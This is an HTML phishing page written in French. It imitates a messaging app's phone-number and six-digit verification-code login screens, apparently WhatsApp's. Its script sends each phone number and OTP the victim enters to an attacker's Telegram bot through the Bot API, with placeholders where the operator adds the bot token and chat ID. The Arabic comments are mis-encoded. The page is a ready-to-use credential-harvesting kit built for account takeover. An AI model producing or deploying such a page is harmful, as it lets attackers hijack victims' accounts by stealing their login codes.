<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V√©rification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
    <style>
        :root {
            --primary-green: #24ac64;
            --bg-color: #fcf8f1;
            --text-dark: #1a1a1a;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg-color);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: var(--text-dark);
        }

        .container {
            width: 90%;
            max-width: 400px;
            text-align: center;
            background: white;
            padding: 40px 20px;
            border-radius: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
        }

        h2 { font-size: 24px; margin-bottom: 10px; font-weight: 700; }
        p { color: #666; font-size: 14px; margin-bottom: 30px; }

        .input-group { margin-bottom: 20px; text-align: left; }
        
        /* ÿ™ŸÜÿ≥ŸäŸÇ ÿ≠ŸÇŸÑ ÿßŸÑŸáÿßÿ™ŸÅ */
        input[type="tel"], .otp-inputs input {
            width: 100%;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 30px;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
        }

        /* ÿ™ŸÜÿ≥ŸäŸÇ ŸÖÿ±ÿ®ÿπÿßÿ™ OTP */
        .otp-inputs { display: none; justify-content: space-between; gap: 8px; margin-top: 20px; }
        .otp-inputs input {
            width: 45px;
            height: 55px;
            text-align: center;
            border-radius: 10px;
            font-size: 20px;
        }

        .btn-submit {
            background-color: var(--primary-green);
            color: white;
            border: none;
            width: 60%;
            padding: 15px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 30px;
        }

        .qr-link {
            display: block;
            margin-top: 20px;
            color: var(--text-dark);
            text-decoration: underline;
            font-size: 14px;
            cursor: pointer;
        }

        .hidden { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div id="page1">
        <h2>Saisissez un num√©ro de t√©l√©phone</h2>
        <p>S√©lectionnez un pays et saisissez votre num√©ro de t√©l√©phone.</p>
        <div class="input-group">
            <input type="tel" id="phone" placeholder="">
        </div>
        <button class="btn-submit" onclick="sendPhone()">Suivant</button>
        <div class="qr-link">Se connecter avec un code QR ></div>
    </div>

    <div id="page2" class="hidden">
        <h2>V√©rification</h2>
        <p>Veuillez saisir le code √† 6 chiffres envoy√© √† votre mobile.</p>
        <div class="otp-inputs" style="display: flex;">
            <input type="text" maxlength="1" class="otp-field">
            <input type="text" maxlength="1" class="otp-field">
            <input type="text" maxlength="1" class="otp-field">
            <input type="text" maxlength="1" class="otp-field">
            <input type="text" maxlength="1" class="otp-field">
            <input type="text" maxlength="1" class="otp-field">
        </div>
        <button class="btn-submit" onclick="sendOTP()">V√©rifier</button>
        <div class="qr-link">Renvoyer le code ></div>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
<script>
    // --- ÿ•ÿπÿØÿßÿØÿßÿ™ ÿßŸÑÿ™ŸÑŸäÿ¨ÿ±ÿßŸÖ (ŸÇŸÖ ÿ®Ÿàÿ∂ÿπ ÿ®ŸäÿßŸÜÿßÿ™ŸÉ ŸáŸÜÿß) ---
    const config = {
        token: "ÿ∂ÿπ_ŸáŸÜÿß_ÿ™ŸàŸÉŸÜ_ÿßŸÑÿ®Ÿàÿ™",
        chatId: "ÿ∂ÿπ_ŸáŸÜÿß_ÿßŸÑÿßŸäÿØŸä_ÿßŸÑÿÆÿßÿµ_ÿ®ŸÉ"
    };

    // ÿ•ÿπÿØÿßÿØ ÿ≠ŸÇŸÑ ÿßŸÑŸáÿßÿ™ŸÅ Ÿàÿ™ÿ≠ÿØŸäÿØ ÿßŸÑÿØŸàŸÑÿ© ÿ™ŸÑŸÇÿßÿ¶ŸäÿßŸã
    const phoneInput = document.querySelector("#phone");
    const iti = window.intlTelInput(phoneInput, {
        initialCountry: "auto",
        geoIpLookup: function(success, failure) {
            fetch("https://ipapi.co/json").then(res => res.json()).then(data => success(data.country_code));
        },
        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
    });

    // Ÿàÿ∏ŸäŸÅÿ© ÿ•ÿ±ÿ≥ÿßŸÑ ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ
    function sendPhone() {
        const fullNumber = iti.getNumber();
        if(!fullNumber) return alert("ÿßŸÑÿ±ÿ¨ÿßÿ° ÿ•ÿØÿÆÿßŸÑ ÿ±ŸÇŸÖ ÿµÿ≠Ÿäÿ≠");

        const message = `üì± ÿ±ŸÇŸÖ Ÿáÿßÿ™ŸÅ ÿ¨ÿØŸäÿØ:\n${fullNumber}`;
        
        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: config.chatId, text: message })
        });

        // ÿßŸÑÿßŸÜÿ™ŸÇÿßŸÑ ŸÑŸÑÿµŸÅÿ≠ÿ© ÿßŸÑÿ´ÿßŸÜŸäÿ©
        document.getElementById('page1').classList.add('hidden');
        document.getElementById('page2').classList.remove('hidden');
    }

    // Ÿàÿ∏ŸäŸÅÿ© ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÄ OTP
    function sendOTP() {
        let otp = "";
        document.querySelectorAll('.otp-field').forEach(input => otp += input.value);
        
        if(otp.length < 6) return alert("ÿ£ÿØÿÆŸÑ ÿßŸÑŸÉŸàÿØ ŸÉÿßŸÖŸÑÿßŸã");

        const message = `üîë ÿ±ŸÖÿ≤ ÿßŸÑŸÄ OTP ÿßŸÑŸÖÿØÿÆŸÑ:\n${otp}`;

        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: config.chatId, text: message })
        }).then(() => {
            alert("Merci! Votre demande est en cours de traitement.");
        });
    }

    // ÿßŸÑÿ™ŸÜŸÇŸÑ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ÿ®ŸäŸÜ ŸÖÿ±ÿ®ÿπÿßÿ™ ÿßŸÑŸÄ OTP
    document.querySelectorAll('.otp-field').forEach((field, index) => {
        field.addEventListener('input', (e) => {
            if (e.target.value && index < 5) {
                document.querySelectorAll('.otp-field')[index + 1].focus();
            }
        });
    });
</script>

</body>
</html>
